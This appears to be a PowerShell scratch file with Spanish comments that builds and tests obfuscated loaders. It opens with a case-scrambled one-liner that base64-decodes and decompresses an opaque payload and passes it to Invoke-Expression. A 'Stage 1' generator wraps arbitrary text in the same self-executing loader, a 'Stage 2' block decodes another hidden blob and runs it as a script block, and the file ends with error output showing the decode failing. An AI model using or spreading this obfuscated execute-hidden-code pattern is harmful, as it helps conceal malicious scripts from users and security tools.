(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'eJyVVstqw0AQ/ZdKYbNBqN3aORieciCTiBgK5KFDWoZKRAJt4MWk3fW/O5CQhAUa3Rt77717JL8RPGeTbO7O3L6TRXMEat9mUOnGYoRMfsHHTBAYFaUqzhK5QmEAwTKivjEYwsPrR+TRcKzHZcAw9zMN5PU4GSHZLgsgAibL9Yo2EQXjC9l6mgdmAnDSEEE67tO6BX/NVoTGjQQzBoXQOZKDFHHShCg8CmHGwXZbB8wxTcfTtxht5JDFPp7VSyZLfhVExGQsV52U1aQNoDEmiFbE7bhhFNsCAei7WeVQjaKM+HgZhNrUinb0mguXHppvODq44bQyzFxTXDGZlvwNfBZwG9zo5Z50Rl3PoB8WfGhHdGyRQ6S+ot0/3+t4/cPh56MAydmC6ENmnVfMvoSduYpy5B9ew4GVpGg17U6tYwOZ5sUZKOnT26ebjv3D1eLVNHObaT+eTDwVVW5Stn8nxpSPJtRGg9CWvsa6nDZfCFc+17qENpt06cV+ELmCN24AdV66pkUer/Nk7lK') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION



# Stage 1

# 1. Escribir el texto a comprimir y codificar
$text = "hoOlaMuundo"

# 2. Convertir el texto en bytes
$textBytes = [System.Text.Encoding]::UTF8.GetBytes($text)

# 3. Comprimir los bytes usando DeflateStream
$memoryStream = New-Object System.IO.MemoryStream
$deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Compress)
$deflateStream.Write($textBytes, 0, $textBytes.Length)
$deflateStream.Close()

# 4. Convertir los bytes comprimidos a una cadena Base64
$compressedBytes = $memoryStream.ToArray()
$encodedString = [System.Convert]::ToBase64String($compressedBytes)

# Mostrar la cadena codificada
Write-Output "Cadena Base64 Comprimida: $encodedString"

# 5. Generar el código PowerShell que descomprimirá y decodificará esta cadena
$decompressionCode = @"
(nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( '$encodedString') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION
"@

Write-Output "Código PowerShell para descomprimir y decodificar:"
Write-Output $decompressionCode

# Stage 2

# Base64 encoded and compressed string
$encodedString = 'eJx9VEtv2jAQ/S9jH5mVNiVu5JbSiYAkKdpIDnHpwt4kjWZHlFiR+fi3dmVt7+zsZBLtO57Zfb9d9VR5lBNmR5Ux+DBItvYKv1EYeqBzr1EIu/BeVsRDlvYZbwmzflbrFvQZUMjCWTWRGEcB7EMi6exfBcQtsFAdUGUGpOAW7QK8EBT4NG2iEplvlHkVnIiScBDU1R4BPkmcEk8Gx44/hmyoPmgMzfGkQ/4ueg59XAvAwkcyArUeQwAfmYA8+KSVSTP/ESymCMWZ8k9Vkx1Z0rECxKLSa4ORd7E7XEgbkGFS+PYLDZFOGQuwVNyijLlBlGukLOzG+NGt5HiV0B2cZjHnJrRaQj28Hc92mvd/QPp/hqD8YT1dq75Z55Id0JdppA3H/2v6R/2/+PgEZ8d0A='

# Decodificar la cadena base64
$decodedBytes = [System.Convert]::FromBase64String($encodedString)

# Crear un MemoryStream con los bytes decodificados
$memoryStream = New-Object System.IO.MemoryStream
$memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
$memoryStream.Position = 0

# Descomprimir usando DeflateStream
$deflateStream = New-Object System.IO.Compression.DeflateStream($memoryStream, [System.IO.Compression.CompressionMode]::Decompress)

# Leer el contenido descomprimido usando StreamReader
$streamReader = New-Object System.IO.StreamReader($deflateStream, [System.Text.Encoding]::ASCII)
$decompressedContent = $streamReader.ReadToEnd()

# Definir el comando para ser ejecutado
$scriptBlock = [ScriptBlock]::Create($decompressedContent)

# Ejecutar el comando
& $scriptBlock



Excepción al llamar a "FromBase64String" con los argumentos "1": "Longitud no válida para una matriz o cadena de
caracteres Base-64."
En línea: 5 Carácter: 1
+ $decodedBytes = [System.Convert]::FromBase64String($encodedString)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FormatException

Excepción al llamar a "Write" con los argumentos "3": "El búfer no puede ser nulo.
Nombre del parámetro: buffer"
En línea: 9 Carácter: 1
+ $memoryStream.Write($decodedBytes, 0, $decodedBytes.Length)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentNullException
